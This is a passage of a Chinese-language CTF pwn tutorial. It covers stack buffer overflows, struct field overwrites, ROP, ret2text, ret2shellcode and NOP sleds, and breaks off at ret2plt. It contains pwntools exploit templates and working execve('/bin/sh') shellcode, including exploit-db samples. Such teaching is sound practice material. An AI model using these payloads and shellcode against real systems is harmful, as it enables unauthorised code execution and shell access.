<li><code>process</code>用于本地测试，地址给二进制文件的地址；</li>
<li><code>remote</code>用于连接服务器。</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.update(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)	<span class="comment">#64位x86程序</span></span><br><span class="line"><span class="comment"># context.update(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)    32位x86程序</span></span><br><span class="line"></span><br><span class="line">elf  = ELF(<span class="string">&#x27;./vuln&#x27;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process(&#x27;./vuln&#x27;)</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;Host&quot;</span>,Port)</span><br><span class="line">    </span><br><span class="line">r.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">64</span> + <span class="string">b&quot;B&quot;</span>*<span class="number">4</span> + p64()</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="Ropgadget"><a href="#Ropgadget" class="headerlink" title="Ropgadget"></a><strong>Ropgadget</strong></h3><p>用于高效准确查找gadgets。</p>
<p><strong>下载</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install python3-ropgadget</span><br></pre></td></tr></table></figure>
<p><strong>用法</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./vuln | grep -E <span class="string">&quot;pop rdi ; ret&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="漏洞以及利用方法"><a href="#漏洞以及利用方法" class="headerlink" title="漏洞以及利用方法"></a><strong>漏洞以及利用方法</strong></h2><p>一般pwn题的核心漏洞主要分为2种：（概况地比较笼统）</p>
<ul>
<li>不安全的输入/边界处理（从而导致溢出，格式化字符串漏洞等问题）</li>
<li>状态/权限/生命周期等逻辑设计或实现错误（比如最普通的Use-After_Free）</li>
</ul>
<p>我们需要利用这些漏洞来修改程序的执行流程，从而达到读取flag或者拿到shell的目的。</p>
<p><br></p>
<p>下面主要分成3部分来讲：</p>
<ul>
<li><strong>溢出（主要关注栈溢出）</strong></li>
<li><strong>格式化字符串漏洞</strong></li>
<li><strong>堆利用</strong></li>
</ul>
<h2 id="溢出-Buffer-Overflow"><a href="#溢出-Buffer-Overflow" class="headerlink" title="溢出 Buffer Overflow"></a><strong>溢出 Buffer Overflow</strong></h2><p><strong>Buffer overflow（缓冲区溢出）漏洞</strong>常见于<strong>不做边界检查</strong>或<strong>边界检查错误</strong>的输入/拷贝函数；可覆盖栈/堆/静态区中的相邻数据（如返回地址、函数指针、对象元数据等）。</p>
<p>当然初次之外还有很多溢出的漏洞表现，比如说整数溢出导致的越界写入等。</p>
<p>而如果溢出是发生在栈上的话，称为<strong>栈溢出</strong>。常见的利用方法是通过溢出修改栈中相邻的内容，如返回地址等。</p>
<p>（<strong>栈溢出</strong>的定义：指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。）</p>
<p>比较简单常见的<strong>栈溢出</strong>的例子的就是，程序给某个变量在栈上分配了一个固定大小的内存，但是程度接收输入时没有仔细检查，导致我们可以将超过这个内存大小的内容写入进这个变量，于是它会覆盖其更高地址的内容。</p>
<h3 id="漏洞-常见危险函数"><a href="#漏洞-常见危险函数" class="headerlink" title="漏洞/常见危险函数"></a><strong>漏洞/常见危险函数</strong></h3><ul>
<li><p><code>gets()</code></p>
<ul>
<li>没有任何输入长度限制/检查。</li>
</ul>
</li>
<li><p><code>fgets(buf, size, stdin)</code></p>
<ul>
<li><p>如果<code>size</code>大于给<code>buf</code>的实际大小，则会溢出。</p>
</li>
<li><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buf[<span class="number">32</span>];</span><br><span class="line">fgets(buf, <span class="number">128</span>, <span class="built_in">stdin</span>);</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p><code>scanf(&quot;%s&quot;, buf)</code></p>
<ul>
<li><p><code>%s</code> 会不断读入字符直到遇到空白符（空格、回车、制表符等）。</p>
</li>
<li><p>安全写法：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%15s&quot;</span>, buf);  <span class="comment">// 最多读 15 个字节 + 1 个 &#x27;\0&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p><code>read(0, buf, count)</code></p>
<ul>
<li><p>如果<code>count</code>大于给<code>buf</code>的实际大小，则会溢出。</p>
</li>
<li><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buf[<span class="number">32</span>];</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">0x100</span>);</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<h3 id="结构体字段劫持"><a href="#结构体字段劫持" class="headerlink" title="结构体字段劫持"></a><strong>结构体字段劫持</strong></h3><p>最简单的攻击目的便是修改写入变量附近的某个变量的值。比如说在下面这个例子里：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">64</span>];</span><br><span class="line">    <span class="type">int</span> is_admin;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You are admin!\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/flag&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user</span> <span class="title">u</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;u, <span class="number">0</span>, <span class="keyword">sizeof</span>(u));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter your name: &quot;</span>);</span><br><span class="line">    fgets(u.name, <span class="number">200</span>, <span class="built_in">stdin</span>);  <span class="comment">// name只有64字节，fgets读200字节</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (u.is_admin == <span class="number">1</span>) &#123;</span><br><span class="line">        win();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Access denied.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们写入的变量为<code>user</code>这个struct里的<code>name</code>，但是由于输入长度限制为200，而实际的<code>name</code>的存储空间仅为64，并且struct里的内容的存储空间是连续的，所以可以通过输入</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;A&#x27;</span>*<span class="number">64</span> + <span class="string">&#x27;\x01\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line"><span class="comment"># 也可以用</span></span><br><span class="line"><span class="string">&#x27;A&#x27;</span>*<span class="number">64</span> + p64(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>将原本的<code>is_admin</code>的值修改为（被覆盖掉为）1。（注意大部分架构都是使用的小端序，并且<code>int</code>的大小为4个Byte，所以是<code>\x01\x00\x00\x00\x00\x00\x00\x00</code>）</p>
<h3 id="ROP（Return-Oriented-Programming）"><a href="#ROP（Return-Oriented-Programming）" class="headerlink" title="ROP（Return Oriented Programming）"></a><strong>ROP（Return Oriented Programming）</strong></h3><p><strong>ROP（返回导向编程）</strong>指的是我们通过漏洞覆盖返回地址，并在栈上布置一条<strong>返回链（ROP Chain）</strong>，使程序在不断执行<code>ret</code>时依次跳转到一系列以<code>ret</code>结尾的gadget<strong>，从而把程序/库中已有的指令片段</strong>组合成所需的执行流程（例如调用<code>system</code>、触发<code>syscall</code>、ORW读flag等）。</p>
<p>因为要覆盖修改返回地址，所以我们需要精确计算我们注入的起始点到返回地址的偏移。</p>
<p>比如说在这个例子里：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">|    buf    |	0x20</span><br><span class="line">| saved RBP |	0x08</span><br><span class="line">|	ret     |</span><br></pre></td></tr></table></figure>
<p>偏移就是<code>0x28</code>。这个偏移很多时候也可以用IDA直接查看栈结构来得到，只不过偶尔IDA的偏移会不准确，这个时候就只能依靠GDB调试来确认。</p>
<p>这个时候通过</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">0x28</span> + p64(fake_ret_addr)</span><br></pre></td></tr></table></figure>
<p>就可以将返回地址修改成<code>fake_ret_addr</code>。</p>
<p>需要注意的是，如果栈溢出的漏洞点是在函数<code>fun()</code>的栈上，那么当<code>fun()</code>执行完之后才会跳转（返回）至我们给定的<code>fake_ret_addr</code>。<code>main()</code>函数的话同理，因为<code>main()</code>函数也有返回地址。</p>
<h4 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a><strong>ret2text</strong></h4><p><strong>ret2text（Return-to-Text）</strong>即<strong>控制程序执行程序本身已有的的代码</strong> (即， <code>.text</code> 段中的代码) 。</p>
<p>这种Exploit一般需要：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Stack:      No canary found</span><br></pre></td></tr></table></figure>
<p>如果开启了PIE，则需要先泄露基址，再计算所需函数的实际地址。</p>
<p><br></p>
<p><strong>例子</strong>（假设程序中原本有一个不需要参数的<code>win()</code>函数，它会调用<code>system(&quot;/bin/sh&quot;)</code>。）：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">win_address = <span class="number">0x0000000000401172</span>		<span class="comment"># win函数地址0x401172</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * offset_to_ret_addr     <span class="comment"># 一路覆盖到返回地址前</span></span><br><span class="line">payload += p64(win_address)</span><br></pre></td></tr></table></figure>
<h4 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a><strong>ret2shellcode</strong></h4><h5 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a><strong>Shellcode</strong></h5><p><strong>shellcode</strong>是一段用于利用软件漏洞而执行的16进制机械码，以其经常让攻击者获得shell而得名。（维基上的定义：<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Shellcode）">https://zh.wikipedia.org/wiki/Shellcode）</a></p>
<p>比较常用的：</p>
<p>1. </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())   <span class="comment"># /bin/sh</span></span><br></pre></td></tr></table></figure>
<p><br></p>
<p>2. </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sc = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    xor rsi, rsi</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    mov rbx, 0x68732f6e69622f</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    mov al, 59</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><br></p>
<p>3. <strong>24位的shellcode</strong>（来源：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/43550">https://www.exploit-db.com/exploits/43550</a> ）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">global _start</span></span><br><span class="line"><span class="comment">section .text</span></span><br><span class="line"><span class="comment">_start:</span></span><br><span class="line"><span class="comment">	push 59</span></span><br><span class="line"><span class="comment">	pop rax</span></span><br><span class="line"><span class="comment">	cdq</span></span><br><span class="line"><span class="comment">	push rdx</span></span><br><span class="line"><span class="comment">	mov rbx,0x68732f6e69622f2f</span></span><br><span class="line"><span class="comment">	push rbx</span></span><br><span class="line"><span class="comment">	push rsp</span></span><br><span class="line"><span class="comment">	pop rdi</span></span><br><span class="line"><span class="comment">	push rdx</span></span><br><span class="line"><span class="comment">	push rdi</span></span><br><span class="line"><span class="comment">	push rsp</span></span><br><span class="line"><span class="comment">	pop rsi</span></span><br><span class="line"><span class="comment">	syscall</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> code[] = <span class="string">&quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&quot;</span>;</span><br><span class="line"><span class="comment">// char code[] = &quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;;</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;len:%d bytes\n&quot;</span>, <span class="built_in">strlen</span>(code));</span><br><span class="line">    (*(<span class="type">void</span>(*)()) code)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><br></p>
<p>4. <strong>23位的shellcode</strong>（来源：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/36858">https://www.exploit-db.com/exploits/36858</a> ）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    #</span></span><br><span class="line"><span class="comment">    # Execve /bin/sh Shellcode Via Push (Linux x86_64 23 bytes)</span></span><br><span class="line"><span class="comment">    #</span></span><br><span class="line"><span class="comment">    # Dying to be the shortest.</span></span><br><span class="line"><span class="comment">    #</span></span><br><span class="line"><span class="comment">    # Copyright (C) 2015 Gu Zhengxiong (rectigu@gmail.com)</span></span><br><span class="line"><span class="comment">    #</span></span><br><span class="line"><span class="comment">    # 27 April 2015</span></span><br><span class="line"><span class="comment">    #</span></span><br><span class="line"><span class="comment">    # GPL</span></span><br><span class="line"><span class="comment">    #</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    .global _start</span></span><br><span class="line"><span class="comment">_start:</span></span><br><span class="line"><span class="comment">    # char *const argv[]</span></span><br><span class="line"><span class="comment">    xorl %esi, %esi</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    # &#x27;h&#x27; &#x27;s&#x27; &#x27;/&#x27; &#x27;/&#x27; &#x27;n&#x27; &#x27;i&#x27; &#x27;b&#x27; &#x27;/&#x27;</span></span><br><span class="line"><span class="comment">    movq $0x68732f2f6e69622f, %rbx</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    # for &#x27;\x00&#x27;</span></span><br><span class="line"><span class="comment">    pushq %rsi</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    pushq %rbx</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    pushq %rsp</span></span><br><span class="line"><span class="comment">    # const char *filename</span></span><br><span class="line"><span class="comment">    popq %rdi</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    # __NR_execve 59</span></span><br><span class="line"><span class="comment">    pushq $59</span></span><br><span class="line"><span class="comment">    popq %rax</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    # char *const envp[]</span></span><br><span class="line"><span class="comment">    xorl %edx, %edx</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    syscall</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  gcc -z execstack push64.c</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  uname -r</span></span><br><span class="line"><span class="comment">  3.19.3-3-ARCH</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *shellcode = <span class="string">&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;strlen(shellcode)=%d\n&quot;</span>, <span class="built_in">strlen</span>(shellcode));</span><br><span class="line"></span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))shellcode)();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="ret2shellcode-1"><a href="#ret2shellcode-1" class="headerlink" title="ret2shellcode"></a><strong>ret2shellcode</strong></h5><p><strong>ret2shellcode</strong>（<strong>Return-to-Shellcode</strong>）指的是：<br>在利用栈溢出等漏洞时，<strong>将自己编写的shellcode注入到内存（常见是栈/堆/<code>.bss</code>）里</strong>，再通过覆盖返回地址或利用跳转<code>gadget</code>（如 <code>jmp *sp</code>）<strong>把控制流重定向到该shellcode</strong>，从而直接执行任意指令。</p>
<p>先只关注将shellcode写入stack并执行：</p>
<p>这种Exploit一般需要：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">NX:         NX enabled		<span class="comment">#重中之重</span></span><br><span class="line"></span><br><span class="line">Stack:      No canary found</span><br><span class="line">PIE:        No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>我们分成开启/关闭ASLR的2种情况来讨论。</p>
<p><strong>1. 开启ASLR：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, buf);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt;&quot;</span>); fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    read(fileno(<span class="built_in">stdin</span>), buf, <span class="number">0x50</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>假设我们可以获取到在stack上的<code>buf</code>的地址（在这个例子里程序会直接给我们）</p>
<p>所以可以构造这样的payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sc = asm(shellcraft.sh())</span><br><span class="line">payload = sc.ljust(<span class="number">0x48</span>, <span class="string">b&quot;A&quot;</span>) + p64(buf_addr)</span><br></pre></td></tr></table></figure>
<p>先将shellcode写进<code>buf</code>，然后修改返回地址让程序跳转至<code>buf</code>的位置执行shellcode。</p>
<p><br></p>
<p>假如无法直接获得buf的地址，但是buf的地址会被存进rsi之类的寄存器，且程序里有类似<code>jmp rsi</code>的gadget。这种情况下我们就可以利用这个gadget跳转至buf的位置：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())   <span class="comment"># /bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 找到 jmp rsi 指令地址</span></span><br><span class="line">JMP_RSI = <span class="built_in">next</span>(elf.search(asm(<span class="string">&#x27;jmp rsi&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">payload = flat(&#123;</span><br><span class="line">    <span class="number">0</span>:      shellcode,  <span class="comment"># shellcode</span></span><br><span class="line">    <span class="number">256</span>:    JMP_RSI     <span class="comment"># 溢出 return address</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p><br></p>
<p><strong>2. 关闭ASLR：</strong></p>
<p>由于关闭了ASLR，所以我们可以在将shellcode写入进stack后直接通过爆破栈地址来执行shellcode。</p>
<p>如果按照这样的Payload结构：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Shellcode] [Return Address]</span><br></pre></td></tr></table></figure>
<p>来爆破地址的话，效率会非常低，因为我们必须精确地爆破到Shellcode（<code>buf</code>）一开始的地址，地址高一位低一位都会失败。</p>
<p>为了提高爆破效率以及成功率，我们可以利用一个叫做<strong>NOP Sled</strong>的方法：</p>
<p><code>NOP</code> 是 “No Operation”（不执行任何操作）的缩写，意思就是“空指令”。CPU执行一条NOP 后，什么状态都不改，只把程序计数器往前挪到下一条指令。</p>
<ul>
<li>在 x86 上，最常见的<code>NOP</code>的机器码是<code>0x90</code>。</li>
</ul>
<p>而当我们将一段很长的NOP添加在我们shellcode前面，就会让我们爆破的难度大大降低。因为我们不再需要精准地返回到shellcode一开始的地址，只要它返回到NOP中的任意位置，就会自动“滑“（这也是“sled”“雪橇”这个词的由来）到后面的shellcode并执行它。</p>
<p>优化后的shellcode的结构：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Padding] [Return Address] [NOP] [Shellcode]</span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[NOP] [Shellcode] [Return Address] </span><br></pre></td></tr></table></figure>
<p>这样一来，我们爆破地址的中间的间隔可以直接设置成NOP的长度，这样并不会错过我们的NOP以及Shellcode，确保了爆破一定能成功并且提高了爆破的效率。</p>
<p>只不过NOP sled的长度会受限于overflow漏洞的长度。如果是scanf之类任意长度写入的漏洞，则sled可以非常长，效率也会更高。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sc = asm(shellcraft.sh())</span><br><span class="line">NOP_len = <span class="number">0x100</span></span><br><span class="line">NOP = <span class="string">b&#x27;\x90&#x27;</span> * NOP_len</span><br><span class="line">code = NOP + sc</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x38</span> + p64(addr_int) + code</span><br></pre></td></tr></table></figure>
<h4 id="ret2plt"><a href="#ret2plt" class="headerlink" title="ret2plt"></a><strong>ret2plt</strong></h4><p><strong>ret2plt</strong>指的是：通过覆盖返回地址，跳转到程序的<strong>PLT (Procedure Linkage Table)</strong>表项中执行特定的函数。</p>
<p>也就是说我们会用程序里已经有（调用过）的函数和gadget来构造ROP，所以常用于程序里已经调用过<code>system</code>函数的情况。</p>
<p>我们分几种情况讨论：</p>
<p><strong>1. 假设程序里有<code>system</code>函数和<code>&quot;/bin/sh&quot;</code>字符串，并且有<code>pop rdi ; ret</code>这个gadget。</strong></p>
